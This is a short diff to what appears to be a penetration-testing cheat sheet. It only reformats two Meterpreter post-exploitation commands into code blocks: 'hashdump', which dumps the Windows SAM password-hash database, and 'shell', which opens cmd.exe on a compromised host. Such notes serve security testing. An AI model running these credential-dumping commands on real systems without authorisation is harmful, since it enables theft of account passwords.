@@ -1,6 +1,9 @@
 ### dump SAM database
-```meterpreter > hashdump```
+
+```bash
+meterpreter > hashdump
+```
 
 ### Change to `cmd.exe`
-`meterpreter > shell`
 
+`meterpreter > shell`
